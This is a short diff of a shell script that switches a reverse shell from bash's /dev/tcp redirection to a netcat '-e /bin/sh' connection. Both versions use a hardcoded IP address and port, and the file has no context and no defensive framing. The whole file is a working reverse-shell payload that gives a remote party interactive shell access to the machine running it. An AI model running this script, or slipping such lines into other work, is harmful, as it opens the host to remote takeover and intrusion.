@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 IP="10.60.99.29"
 PORT="4456"
-bash -i >& /dev/tcp/$IP/$PORT 0>&1
+/usr/bin/nc $IP $PORT -e /bin/sh
